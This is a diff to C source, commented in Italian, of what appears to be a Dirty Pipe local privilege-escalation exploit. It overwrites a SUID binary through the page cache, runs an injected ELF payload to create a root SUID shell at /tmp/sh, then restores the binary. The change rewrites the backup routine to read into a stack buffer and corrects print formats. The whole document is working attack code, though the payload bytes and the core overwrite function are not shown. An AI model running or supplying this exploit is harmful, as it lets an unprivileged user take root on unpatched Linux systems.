@@ -12,7 +12,6 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/mman.h>
 #include <sys/stat.h>
 #include <sys/user.h>
 #include <stdint.h>
@@ -97,26 +96,28 @@ void prepara_pipe(int p[2] ){
 }
 
 
-uint8_t * backup_binary(char * path){
+ssize_t backup_binary(char * path, uint8_t * backup){
 
-	int fd;
-	char *bytes;
+        int fd;
+        int bytes;
 
-	if ( ( fd = open( path, O_RDONLY ) ) < 0 ){
-		fprintf(stderr,"[x] Errore nell'apertura file: %s \n",path);
-		exit(EXIT_FAILURE);
-	}
+        if ( ( fd = open( path, O_RDONLY ) ) < 0 ){
+                fprintf(stderr,"[x] Errore nell'apertura file: %s \n",path);
+                exit(EXIT_FAILURE);
+        }
 
-	bytes = mmap(NULL,ELFCODE_SIZE,PROT_READ, MAP_PRIVATE, fd, 1);
-	
-    if (close(fd) == -1) {
-        perror("Failed to close the file");
-        exit(EXIT_FAILURE);
-    }
+        lseek(fd, 1, SEEK_SET);
+        bytes = read(fd, backup, ELFCODE_SIZE);
 
-	return bytes;
+        if (close(fd) == -1) {
+            perror("Failed to close the file");
+            exit(EXIT_FAILURE);
+        }
+
+        return bytes;
 
 }
+
 
 
 void punta_page_cache(int fd, int p[2]){
@@ -173,11 +174,12 @@ void main(int argc, char **argv){
 	int p[2];
 	FILE *pr;
 	char *path = argv[1]; //argomento: percorso completo a SUID binary
-	uint8_t *orig_bytes;
+	uint8_t backup[ELFCODE_SIZE];
+
 
 
 	if( ELFCODE_SIZE > PAGE_SIZE-2 ){
-		fprintf(stderr,"[x] Payload troppo grande (%d Byte. Massimo consentito: %d Byte)\n",ELFCODE_SIZE,PAGE_SIZE-2);
+		fprintf(stderr,"[x] Payload troppo grande (%lu Byte. Massimo consentito: %lu Byte)\n",ELFCODE_SIZE,PAGE_SIZE-2);
 		exit(EXIT_FAILURE);
 	}
 
@@ -188,12 +190,11 @@ void main(int argc, char **argv){
 	}
 
 
-	orig_bytes = backup_binary(path);
-	printf("[v] backup SUID binary ( %lu bytes ) \n" , sizeof(orig_bytes));
-	if( sizeof(orig_bytes) < ELFCODE_SIZE){
-		perror("[x] ELFCODE_SIZE troppo grande per la binary");
-		exit(EXIT_FAILURE);
-	}
+    if(backup_binary(path,backup) < ELFCODE_SIZE){
+            fprintf(stderr,"[x] ELFCODE troppo grande \n");
+            exit(EXIT_FAILURE);
+    }
+    printf("[v] backup SUID binary \n");
 
 
 	dirty_pipe(p,path,elfcode);
@@ -208,7 +209,7 @@ void main(int argc, char **argv){
 	printf("[v] SUID binary eseguita; generazione SUID shell /tmp/sh \n");
 
 
-	dirty_pipe(p,path,orig_bytes);
+	dirty_pipe(p,path,backup);
 	printf("[v] SUID binary restaurata \n");
 	printf("\n ricorda di eseguire 'rm /tmp/sh' prima di uscire\n");
 
